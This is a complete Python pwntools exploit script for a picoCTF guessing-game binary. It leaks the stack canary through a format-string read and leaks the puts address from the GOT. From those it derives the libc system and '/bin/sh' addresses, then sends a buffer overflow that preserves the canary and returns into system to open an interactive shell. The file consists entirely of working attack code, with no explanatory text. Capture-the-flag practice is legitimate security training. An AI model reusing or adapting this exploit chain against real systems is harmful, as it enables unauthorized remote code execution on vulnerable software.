import pwn
import struct

p = pwn.remote("jupiter.challenges.picoctf.org", 43578)
# p = pwn.remote("localhost", 8080)

OFFSET_OF_PUTS = 0x67560
OFFSET_OF_SYSTEM = 0x0003cf10
OFFSET_OF_BIN_SH = 0x17b9db


def little_to_big_endian(hex_value):
    # Remove the '0x' prefix if present
    hex_value = hex_value[2:] if hex_value.startswith('0x') else hex_value
    # Split the hex value into pairs of characters
    hex_pairs = [hex_value[i:i+2] for i in range(0, len(hex_value), 2)]
    # Reverse the order of the pairs and join them
    little_endian = ''.join(reversed(hex_pairs))
    return '0x' + little_endian


def extract_guarded_leak(input: bytes):
    print(input)
    start_marker = b'_'
    end_marker = b'_'

    start_index = input.find(start_marker) + len(start_marker)
    end_index = input.find(end_marker, start_index)

    if start_index != -1 and end_index != -1:
        hex_value_bytes = input[start_index:end_index]
        return hex_value_bytes
    raise RuntimeError("Value not found")


def extract_hex_value(input: bytes) -> int:
    hex_value_bytes = extract_guarded_leak(input)
    hex_value = hex_value_bytes.decode('utf-8')
    decimal_value = int(hex_value, 16)
    return decimal_value


def send_guess():
    p.sendline(b"-3727")


def leak_cannary_value() -> int:
    print(p.readuntil("Name?"))
    pos_of_cannary_value_on_stack = b"_%135$x_"
    p.sendline(pos_of_cannary_value_on_stack)
    cannary_value = extract_hex_value(p.readuntil("What number would you like to guess?"))
    print("next round")
    return cannary_value


def leak_puts_address():
    print(p.readuntil("Name?").decode())
    puts_at_got = 0x08049fdc
    payload = [
        b"A" * 8  + b"A_%11$s_",
        pwn.p32(puts_at_got)
    ]
    p.sendline(b"".join(payload))
    leaked_data = extract_guarded_leak(p.readuntil("What number would you like to guess?"))
    puts_at_plt_l = hex(struct.unpack('>I', leaked_data[:4])[0]) #int.from_bytes(leaked_data, "little")
    puts_at_plt_b = little_to_big_endian(puts_at_plt_l)
    print(f"puts is at {puts_at_plt_b}")
    return int(puts_at_plt_b, 16)


def calc_system_address(puts_at_plt: int) -> int:
    base = puts_at_plt - OFFSET_OF_PUTS
    system_at_plt = base + OFFSET_OF_SYSTEM
    return system_at_plt


def calc_bin_sh_address(puts_at_plt: int) -> int:
    base = puts_at_plt - OFFSET_OF_PUTS
    bin_sh_address = base + OFFSET_OF_BIN_SH
    return bin_sh_address


def i_shell_pass(cannary_value: int, system_at_plt: int, bin_sh_address: int):
    print(p.readuntil("Name?").decode())
    junk = b"A" * 0x200
    payload = [
        junk,
        pwn.p32(cannary_value),
        b"A" * 12,
        pwn.p32(system_at_plt),
        pwn.p32(bin_sh_address),
        pwn.p32(bin_sh_address)
    ]
    p.sendline(b"".join(payload))
    print("rop sent")


def main():
    print(p.readuntil("What number would you like to guess?"))
    send_guess()
    cannary_value = leak_cannary_value()
    send_guess()
    puts_at_plt = leak_puts_address()
    system_at_plt = calc_system_address(puts_at_plt)
    bin_sh_address = calc_bin_sh_address(puts_at_plt)
    send_guess()
    i_shell_pass(cannary_value, system_at_plt, bin_sh_address)
    p.interactive()


if __name__ == "__main__":
    main()
